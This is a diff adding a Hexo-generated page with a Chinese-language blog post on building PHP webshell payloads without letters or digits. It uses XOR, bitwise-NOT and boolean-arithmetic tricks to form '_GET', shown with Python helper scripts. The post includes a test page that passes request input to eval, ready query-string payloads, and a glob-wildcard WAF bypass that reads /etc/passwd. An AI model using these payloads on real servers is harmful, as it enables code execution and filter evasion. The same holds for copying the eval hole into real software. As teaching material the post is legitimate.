@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">
+
+
+
+
+
+
+<meta name="description" content="trickphp短标签php一共支持四种标签形式  详细内容参考http://w3c.3306.biz/php_course/show-12-17-1.html 123456&amp;lt;?php ?&amp;gt;  //最常用的一种形式，不解释&amp;lt;?= ?&amp;gt;   //类似于&amp;lt;?php echo &quot;&quot;;?&amp;gt;&amp;lt;script language=php&amp;gt; &amp;lt;/script">
+<meta property="og:type" content="article">
+<meta property="og:title" content="极限利用">
+<meta property="og:url" content="http://yoursite.com/2019/09/19/极限利用/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="trickphp短标签php一共支持四种标签形式  详细内容参考http://w3c.3306.biz/php_course/show-12-17-1.html 123456&amp;lt;?php ?&amp;gt;  //最常用的一种形式，不解释&amp;lt;?= ?&amp;gt;   //类似于&amp;lt;?php echo &quot;&quot;;?&amp;gt;&amp;lt;script language=php&amp;gt; &amp;lt;/script">
+<meta property="og:locale" content="zh">
+<meta property="og:updated_time" content="2019-09-19T14:04:40.033Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="极限利用">
+<meta name="twitter:description" content="trickphp短标签php一共支持四种标签形式  详细内容参考http://w3c.3306.biz/php_course/show-12-17-1.html 123456&amp;lt;?php ?&amp;gt;  //最常用的一种形式，不解释&amp;lt;?= ?&amp;gt;   //类似于&amp;lt;?php echo &quot;&quot;;?&amp;gt;&amp;lt;script language=php&amp;gt; &amp;lt;/script">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/19/极限利用/">
+
+
+
+
+
+  <title>极限利用 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/19/极限利用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">极限利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-19T19:18:00+08:00">
+                2019-09-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <a id="more"></a>
+
+<h2 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h2><h3 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h3><p>php一共支持四种标签形式 </p>
+<p>详细内容参考<a href="http://w3c.3306.biz/php_course/show-12-17-1.html" target="_blank" rel="noopener">http://w3c.3306.biz/php_course/show-12-17-1.html</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="meta">?&gt;</span>  <span class="comment">//最常用的一种形式，不解释</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>= <span class="meta">?&gt;</span>   <span class="comment">//类似于<span class="meta">&lt;?php</span> echo "";<span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;script language=php&gt; &lt;/script&gt;  <span class="comment">//等效于<span class="meta">&lt;?php</span> <span class="meta">?&gt;</span></span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">""</span>; %&gt;     <span class="comment">//asp风格的标签</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>$GLOBALS</p>
+<p>这个全局变量数组中存放在php中的所有变量，变量名就是键名</p>
+<h3 id="linux-glob通配符"><a href="#linux-glob通配符" class="headerlink" title="linux glob通配符"></a>linux glob通配符</h3><p>*代表任意字符</p>
+<p>?一个字符</p>
+<h3 id="命令续行符"><a href="#命令续行符" class="headerlink" title="命令续行符"></a>命令续行符</h3><p>\  如果命令太长可以使用续行符，把一行命令拆成多行</p>
+<h3 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h3><p>异或</p>
+<p>相同返回0 不同返回1</p>
+<p>取反</p>
+<p>~</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="不使用数字和字母写shell"><a href="#不使用数字和字母写shell" class="headerlink" title="不使用数字和字母写shell"></a>不使用数字和字母写shell</h3><h4 id="异或构造"><a href="#异或构造" class="headerlink" title="异或构造"></a>异或构造</h4><p>利用异或来构造GET(因为get比post短，容易构造,当然构造Post也可以)</p>
+<p>python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arr=[chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(ord(<span class="string">'a'</span>),ord(<span class="string">'z'</span>))] + [chr(j) <span class="keyword">for</span> j <span class="keyword">in</span> range(ord(<span class="string">'A'</span>),ord(<span class="string">'Z'</span>))]</span><br><span class="line">str_list = [<span class="string">'`'</span>,<span class="string">'~'</span>,<span class="string">'!'</span>,<span class="string">'@'</span>,<span class="string">'%'</span>,<span class="string">'^'</span>,<span class="string">'*'</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'-'</span>,<span class="string">'+'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">':'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'.'</span>,<span class="string">','</span>,<span class="string">';'</span>,<span class="string">'|'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str_list:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str_list:</span><br><span class="line">        s = chr(ord(i)^ord(j))</span><br><span class="line">        print(i,j,s)</span><br></pre></td></tr></table></figure>
+
+<p>_GET组合</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">! ~ _</span><br><span class="line">    </span><br><span class="line">: &#125; G</span><br><span class="line"></span><br><span class="line">&#123; &gt; E</span><br><span class="line"></span><br><span class="line">&#125; ) T</span><br><span class="line"></span><br><span class="line"><span class="comment">//:&#123;&#125;^&#125;&gt;)  ==&gt; GET</span></span><br></pre></td></tr></table></figure>
+
+<p>测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">eval</span>($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>两种方式</p>
+<p>no.1 直接构造getflag，调用  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=$_=<span class="string">'[[]|@[['</span>^<span class="string">'&lt;&gt;):,:&lt;'</span>;$_();</span><br></pre></td></tr></table></figure>
+
+<p>no.2 先构造_GET，然后通过get调用getflag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=$&#123;<span class="string">'!:&#123;&#125;'</span>^<span class="string">'~&#125;&gt;)'</span>&#125;&#123;<span class="string">'_'</span>&#125;();&amp;_=getflag</span><br><span class="line">?a=$&#123;<span class="string">'!:&#123;&#125;'</span>^<span class="string">'~&#125;&gt;)'</span>&#125;[<span class="string">'_'</span>]();&amp;_=getflag</span><br></pre></td></tr></table></figure>
+
+<p>如果对参数有长度有限制，第二种要比第一种好一点</p>
+<p>这里还有两个东西 php可变变量 复杂变量 </p>
+<p>具体参考</p>
+<p><a href="https://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.variables.variable.php</a></p>
+<h4 id="取反构造"><a href="#取反构造" class="headerlink" title="取反构造"></a>取反构造</h4><p>参考链接</p>
+<p><a href="https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/" target="_blank" rel="noopener">https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/</a></p>
+<p>原理</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">"和"</span>.encode())</span><br><span class="line"><span class="string">b'\xe5\x92\x8c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">"和"</span>.encode()[<span class="number">2</span>])</span><br><span class="line"><span class="number">140</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(~<span class="string">"和"</span>.encode()[<span class="number">2</span>])</span><br><span class="line"><span class="number">-141</span></span><br></pre></td></tr></table></figure>
+
+<p>“和”的第三个字节的值为140[0x8c]，取反的值为-141。<br>负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=<span class="string">"和"</span>;</span><br><span class="line"><span class="keyword">print</span>(~($_&#123;<span class="number">2</span>&#125;));</span><br><span class="line"><span class="keyword">print</span>(~<span class="string">"\x8c"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出 ss</span></span><br></pre></td></tr></table></figure>
+
+<p>python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(shell)</span>:</span></span><br><span class="line">    hexbit=<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x: hex(~(-(<span class="number">256</span>-ord(x)))),shell))</span><br><span class="line">    <span class="keyword">return</span> hexbit</span><br><span class="line">result=get(<span class="string">'get'</span>).replace(<span class="string">'0x'</span>,<span class="string">'%'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
+<p>no.1 直接调用 getflag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">98</span>%<span class="number">9</span>a%<span class="number">8</span>b%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>e%<span class="number">98</span>)();   <span class="comment">//这样貌似也可以，但是我没复现出来，还是老方法</span></span><br><span class="line">?a=$_=(~%<span class="number">98</span>%<span class="number">9</span>a%<span class="number">8</span>b%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>e%<span class="number">98</span>);$_();</span><br></pre></td></tr></table></figure>
+
+<p>no.2 同样构造_GET调用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=$&#123;~%a0%b8%ba%ab&#125;&#123;<span class="string">'_'</span>&#125;();&amp;_=getflag</span><br></pre></td></tr></table></figure>
+
+<h4 id="只用数字构造"><a href="#只用数字构造" class="headerlink" title="只用数字构造"></a>只用数字构造</h4><p>PHP中true+true==2  </p>
+<p>不为空的字符串为true，对字符串取非,在取非就能获得1</p>
+<p>参考链接</p>
+<p><a href="https://xz.aliyun.com/t/5677" target="_blank" rel="noopener">https://xz.aliyun.com/t/5677</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造true</span></span><br><span class="line">var_dump(!@a);  ==&gt; bool(<span class="keyword">false</span>)</span><br><span class="line"></span><br><span class="line">var_dump(!!@a);  ==&gt; bool(<span class="keyword">true</span>)</span><br><span class="line">var_dump(<span class="keyword">true</span>+<span class="keyword">true</span>); ==&gt;  int(<span class="number">2</span>)</span><br><span class="line">var_dump((!!@a+!!@a)*(!!@a+!!@a)); ==&gt; int(<span class="number">4</span>)  <span class="comment">//使用*运算</span></span><br><span class="line">var_dump((!!@a+!!@a)**(!!@a+!!@a+!!@a));  ==&gt; int(<span class="number">8</span>)  <span class="comment">//使用**运算符，进行指数运算，php5.6才有</span></span><br><span class="line"></span><br><span class="line">chr((!!@a+!!@a+!!@a+!!@a)**(!!@a+!!@a+!!@a)+!!@a+!!@a+!!@a+!!@a+!!@a+!!@a+!!@a);  ==&gt;G</span><br><span class="line">chr((!!@a+!!@a+!!@a+!!@a)**(!!@a+!!@a+!!@a)+!!@a+!!@a+!!@a+!!@a+!!@a); ==&gt;E</span><br><span class="line">chr((!!@a+!!@a+!!@a)**(!!@a+!!@a+!!@a+!!@a)+!!@a+!!@a+!!@a); ==&gt;T</span><br><span class="line">chr((!!@a+!!@a+!!@a+!!@a)**(!!@a+!!@a+!!@a)+!!@a+!!@a+!!@a+!!@a+!!@a+!!@a+!!@a).chr((!!@a+!!@a+!!@a+!!@a)**(!!@a+!!@a+!!@a)+!!@a+!!@a+!!@a+!!@a+!!@a).chr((!!@a+!!@a+!!@a)**(!!@a+!!@a+!!@a+!!@a)+!!@a+!!@a+!!@a);  ==&gt; GET</span><br></pre></td></tr></table></figure>
+
+<p>另一种构造true的思路</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_=(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>)+(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>)</span><br><span class="line"><span class="keyword">print</span>($_)</span><br><span class="line"><span class="keyword">print</span>($_/$_)</span><br><span class="line"></span><br><span class="line">结果会输出：<span class="number">2</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="不可见字符"><a href="#不可见字符" class="headerlink" title="不可见字符"></a>不可见字符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $_ = $_GET[<span class="string">'a'</span>] ^ $_GET[<span class="string">'b'</span>];</span><br><span class="line">    <span class="keyword">print</span>(urlencode($_));</span><br></pre></td></tr></table></figure>
+
+<p>_GET ^ %ff%ff%ff%ff  ==&gt;  %A0%B8%BA%AB</p>
+<p>异或两次，得到原字符</p>
+<p>%A0%B8%BA%AB  ^  %ff%ff%ff%ff  ==&gt; _GET</p>
+<h4 id="glob通配符"><a href="#glob通配符" class="headerlink" title="glob通配符"></a>glob通配符</h4><p>利用* ? 可以绕过waf</p>
+<p>如果waf会检测cat等命令或者文件名，可以用* ? 通配符绕过</p>
+<p>/bin/?at /etc/passwd  这样就可以读到/etc/passwd文件的内容</p>
+<p>还有执行运算符`` 可以执行命令</p>
+<p>`` ==&gt;shell_exec</p>
+<p>参考链接</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
+<p>其他的链接都放在文中了</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/19/commix-testbed/" rel="next" title="commix-testbed">
+                <i class="fa fa-chevron-left"></i> commix-testbed
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="John Doe">
+          <p class="site-author-name" itemprop="name">John Doe</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#trick"><span class="nav-number">1.</span> <span class="nav-text">trick</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php短标签"><span class="nav-number">1.1.</span> <span class="nav-text">php短标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#全局变量"><span class="nav-number">1.2.</span> <span class="nav-text">全局变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-glob通配符"><span class="nav-number">1.3.</span> <span class="nav-text">linux glob通配符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令续行符"><span class="nav-number">1.4.</span> <span class="nav-text">命令续行符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运算"><span class="nav-number">1.5.</span> <span class="nav-text">运算</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">2.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#不使用数字和字母写shell"><span class="nav-number">2.1.</span> <span class="nav-text">不使用数字和字母写shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#异或构造"><span class="nav-number">2.1.1.</span> <span class="nav-text">异或构造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#取反构造"><span class="nav-number">2.1.2.</span> <span class="nav-text">取反构造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#只用数字构造"><span class="nav-number">2.1.3.</span> <span class="nav-text">只用数字构造</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不可见字符"><span class="nav-number">2.2.</span> <span class="nav-text">不可见字符</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#glob通配符"><span class="nav-number">2.2.1.</span> <span class="nav-text">glob通配符</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
